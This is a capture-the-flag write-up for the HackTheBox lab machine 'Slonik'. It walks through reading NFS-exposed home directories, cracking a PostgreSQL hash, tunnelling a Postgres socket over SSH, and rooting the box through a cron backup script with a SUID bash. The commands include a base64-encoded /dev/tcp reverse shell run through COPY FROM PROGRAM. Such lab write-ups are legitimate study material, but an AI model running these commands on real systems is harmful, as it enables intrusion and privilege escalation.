# [HackTheBox - Slonik](https://app.hackthebox.com/machines/Slonik)

![83fb37a52cd7f1e70f4a5c5a558c3a32.png](/resources/83fb37a52cd7f1e70f4a5c5a558c3a32.png)

## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Initial Access via PostgresSQL](#initial-access-via-postgressql)
- [Privilege Escalation](#privilege-escalation)

***
## Abstract 
Slonik is a vulnlab machine imported to HackTheBox as an Medium Linux box, I started with network enumeration with nmap, revealing this machine is a running SSH, rpc and NFS share on port 2049.

The nfs share have 2 exposed directory which is `/var/backups` and `/home` folder revealing the service user on the machine which I created new user that match UID of service user to read the file of this user.

The bash history file reveals the the usage of PostgreSQL and Unix domain socket that PostgreSQL creates for local client connections and the psql history fiel reveals the password hash of service user which I cracked it and connect to the PostgresSQL after forward the Postgres Unix socket using StreamLocal with SSH and finally obtain a foothold as posgres user on the machine.

There is a backup script running on this machine every minute as root which I took advantage of it by copy bash binary to the directory that was the target of the backup and set SUID of this binary and allow everyone to execute it, once this bash SUID binary was backup then the owner is changed and I executed SUID binary and root the box.

## Enumeration

I start my nmap enumeration with `-sCV` for service enumeration and nmap script engine which reveals port 22 for SSH, 111 for RPC and lastly 2049 for NFS.

![c8b9593a04c6692cd118168c8c739b94.png](/resources/c8b9593a04c6692cd118168c8c739b94.png)

The NFS service exposed 2 directories that I can mount.

```
┌──(kali㉿kali)-[~/HTB/VL]
└─$ showmount -e slonik.vl  
Export list for slonik.vl:
/var/backups *
/home        *
```

After create a directory used for mounting, I will mount both directories to this newly creately directory and found 9 backup file inside `backups` and the timestamp incidates that there is a backup every minutes on the machine, and there is a "service" user on the machine as well. 

```
sudo mount -t nfs slonik.vl: ./nfs_mount -o nolock
```
![64f6435c9ef39497d762d3b3b25c74ee.png](/resources/64f6435c9ef39497d762d3b3b25c74ee.png)

I can not read the file inside home directory of service user due to the GID and UID not match the UID and GID of "service" user

![9b76e9eb6a8d6fd3a70817459690cdb7.png](/resources/9b76e9eb6a8d6fd3a70817459690cdb7.png)

I will create user and group that match UID and GID of service user and spawn a shell as this user without creating home directory and now I can read all files inside home directory of service user. There are 2 files that caught my interested, first is `.bash_history` and second is `.psql_history`

```
sudo groupadd -g 1337 svc1337 
sudo useradd -u 1337 -g 1337 -M -s /bin/bash svc1337
sudo -u svc1337 -i
```
![414e5d061aa50e7db29b184abb8cd434.png](/resources/414e5d061aa50e7db29b184abb8cd434.png)

The `.bash_history` file reveals the existence of postgres SQL user and service running locally on the machine.

![5eec89e6271f6ab42febe1c15d915ccf.png](/resources/5eec89e6271f6ab42febe1c15d915ccf.png)

The `.psql_history` file reveals the password hash of service user in postgres SQL database so I will try to crack it if I can use that to get a foothold via SSH.

![9eb2e4b41a14d96c32798da7a6933daf.png](/resources/9eb2e4b41a14d96c32798da7a6933daf.png)

CrackStation found its match in an instant and look like service is also the password of the service user.

![a0d97753f50badbeedc2887890e2e34a.png](/resources/a0d97753f50badbeedc2887890e2e34a.png)

I try to connect to SSH with this credential but SSH session terminate right away after successful connection.

```
sshpass -p 'service' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" service@slonik.vl
```
![8f6860c83a39b075fc6056c3177e51e8.png](/resources/8f6860c83a39b075fc6056c3177e51e8.png)

## Initial Access via PostgresSQL

I recheck the bash history again I found that I missed something and that is `/var/run/postgresql/.s.PGSQL.5432` which is a Unix domain socket that PostgreSQL creates for local client connections. Instead of talking over TCP, many local Postgres clients (like psql) use this file-based socket: the server listens on that socket filename and a client connects to it to get a Postgres session. That socket only accepts connections from the machine where PostgreSQL is running (or via something that forwards the socket), so I can’t normally reach it from a remote machine over plain SSH unless I forward it.

![69d2f46706593d3b1447c3fd54e83635.png](/resources/69d2f46706593d3b1447c3fd54e83635.png)

Luckily for me that I can forward this socket to my machine using SSH.

```
sshpass -p 'service' ssh -f -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" service@slonik.vl
```
![f5822b6353823148962b2d3811af5ef9.png](/resources/f5822b6353823148962b2d3811af5ef9.png)

Now I will use that socket located on my tmp directory to connect to PostgresSQL service.

```
psql -h /tmp -U postgres
```
![9ae22502abbd6cae473ac556d3cf2961.png](/resources/9ae22502abbd6cae473ac556d3cf2961.png)

There is nothing really interesting in PostgresSQL but I can run system command as postgres user.

```
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```
![170a4d60bd7ff7a383f1a3096ec37bba.png](/resources/170a4d60bd7ff7a383f1a3096ec37bba.png)

I tried to execute reverse shell connection on port 4444 several times but no hit but as soon as I changed it to port 443 then I got a reverse shell in my penelope listener which mean it has firewall block outbound uncommon port.  

```
DROP TABLE cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzQvNDQzIDA+JjEpICY=|base64 -d|bash';SELECT * FROM cmd_exec;
```
![ce48bdecc2f21ef8058c38d970cc8ba7.png](/resources/ce48bdecc2f21ef8058c38d970cc8ba7.png)

and now I can loot user flag and continue my exploration on this machine.

![6196f644f84e963b0820011483d91832.png](/resources/6196f644f84e963b0820011483d91832.png)

## Privilege Escalation 

I remember that there should be a backup script running every minutes as seen in backup share so I execute `pspy64s` to find the location of this script.

```
wget http://$OUR_IP/pspy64s
chmod +x pspy64s
./pspy64s
```
![0fdf5d45579ca7057f032de5ff3e2fc5.png](/resources/0fdf5d45579ca7057f032de5ff3e2fc5.png)

Now I can see cronjob that run `/usr/bin/backup` every minute and looking at `/bin/sh` also running then this `backup` must be the script and not ELF binary.

![b0291f9ddb8ffdb2ac19076f68f9f5ba.png](/resources/b0291f9ddb8ffdb2ac19076f68f9f5ba.png)

The script will back up 2 directories, first it will remove all files inside `/opt/backups/current` and use `ps_basebackup` to take a base backup of a running PostgreSQL database to `/opt/backups/current` directory and will also zip file in that directory in zip file to `/var/backups`.

![d2d1eb4a7e856ceccdb3fd9da85c0e59.png](/resources/d2d1eb4a7e856ceccdb3fd9da85c0e59.png)

I check the base PostgresSQL database location and `/opt/backups/current` which confirms that all files in this directory will be backup to `/opt/backups/current` and I can write any file to this location.

![7fb192b2f595909271a81e9e86d8b306.png](/resources/7fb192b2f595909271a81e9e86d8b306.png)

I will copy the bash binary to database directory and give world and SETUID permission over this binary and after it moving move to `/opt/backups/current`, the owerner will be change to root and thats how I will root the box.

>when a binary file has the setuid bit set, the kernel sets the process’s effective UID to the file’s owner at `exec()` time. So if you change the file’s owner to root and the file has the setuid bit, running that binary will run with EUID root.

```
cp /bin/bash .
chmod 777 bash
chmod u+s bash
```
![31c5480e5fdfec306aaf48b725d4e6e9.png](/resources/31c5480e5fdfec306aaf48b725d4e6e9.png)

Wait for a minute to let the backup script run and now I have SETID bash own by root!

![3a490bcda50ad351a16cf9b65468c1fc.png](/resources/3a490bcda50ad351a16cf9b65468c1fc.png)

Now I execute SUID bash binary to get UID of the root user and loot the flag to root the box.

```
/opt/backups/current/bash -p
```
![18e0831e360cf83f2414c44c79a39ab4.png](/resources/18e0831e360cf83f2414c44c79a39ab4.png)

![b513661dd8cfc0cb1b356a8b8eeeff30.png](/resources/b513661dd8cfc0cb1b356a8b8eeeff30.png)

https://labs.hackthebox.com/achievement/machine/1438364/769
***